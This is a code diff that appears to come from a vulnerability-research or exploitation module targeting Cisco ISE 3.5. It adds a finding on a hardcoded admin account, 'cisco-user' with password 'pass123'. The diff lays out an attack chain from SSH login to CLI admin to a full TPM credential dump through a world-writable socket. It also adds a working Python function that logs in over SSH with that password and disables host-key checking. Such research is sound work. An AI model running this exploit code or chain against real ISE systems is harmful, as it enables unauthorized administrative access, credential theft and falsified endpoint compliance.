@@ -111,6 +111,14 @@ ISE-F59: vaservice TimesTen in-memory DB — blank password for vatt DSN [MEDIUM
   Health check: ttIsql 'DSN=vatt' with no password — confirms no-auth design
   Write access: falsify endpoint compliance posture -> ISE grants network access to quarantined endpoints
   Source: vaservice.properties; cloud_initial_setup.sh:303-315; vattcontrol.sh:60; irf-control.sh:818
+ISE-F60: cisco-user:pass123 — hardcoded ConfD CLI admin account seeded at every ISE setup [HIGH]
+  initial_config.py:9: USERNAME={'username':"cisco-user","password":"plain","password_val":"pass123","role":"admin"}
+  confdsetupctl.sh:27-28: generate_xml.py -> initial_configuration.xml -> CONFD_CDB
+  username_conf.py subscriber: useradd -g gadmin -s confdsh.sh cisco-user; echo pass123 | passwd cisco-user
+  Persistent: update_auth_xml.sh only randomizes aaa_init.xml admin, never touches cisco-user
+  Chain: ssh cisco-user@ISE -> confdsh.sh -> confd_cli --groups=admin -> full ISE CLI admin
+  gadmin group: can access world-writable key_manager.sock -> /all_data -> full TPM credential dump
+  Source: initial_config.py:9; generate_xml.py:152-170; confdsetupctl.sh:27-28; subscriber/username_conf.py
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3959,6 +3967,27 @@ exit;
     return result
 
 
+def ssh_as_cisco_user(ise_host: str, password: str = "pass123") -> dict:
+    """ISE-F60: SSH to ISE as cisco-user with hardcoded password.
+    Account seeded at every ISE setup via initial_config.py -> ConfD CDB -> username_conf.py.
+    gadmin group -> key_manager.sock access (F1/F13) + full ConfD CLI admin.
+    """
+    import subprocess
+    result: dict = {"host": ise_host, "user": "cisco-user", "password": password}
+    try:
+        out = subprocess.check_output(
+            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
+             f"cisco-user@{ise_host}", "id"],
+            input=password.encode(), timeout=15, stderr=subprocess.STDOUT
+        )
+        result["output"] = out.decode()
+        result["status"] = "authenticated"
+        result["note"] = "F60 confirmed: cisco-user:pass123 SSH auth succeeded. gadmin group -> confd_cli admin."
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 def connect_timesten_vatt_no_auth(host: str = "127.0.0.1", port: int = 53395) -> dict:
     """ISE-F59: Connect to vaservice TimesTen DB (DSN=vatt) with blank password.
     Daemon binds to 127.0.0.1:53395. Any local process connects without credentials.
@@ -3999,7 +4028,7 @@ def dump_timesten_vatt_compliance_data() -> dict:
 
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.30.0",
+    "version": "1.31.0",
     "target": "Cisco ISE 3.5.0.527",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -4012,13 +4041,13 @@ MODULE_META = {
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
         "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
         "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F53",
-        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57", "ISE-F58", "ISE-F59",
+        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57", "ISE-F58", "ISE-F59", "ISE-F60",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49", "ISE-F58"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
-             "ISE-F39", "ISE-F44", "ISE-F48", "ISE-F54", "ISE-F56", "ISE-F57"],
+             "ISE-F39", "ISE-F44", "ISE-F48", "ISE-F54", "ISE-F56", "ISE-F57", "ISE-F60"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47",
                "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F55", "ISE-F59"],
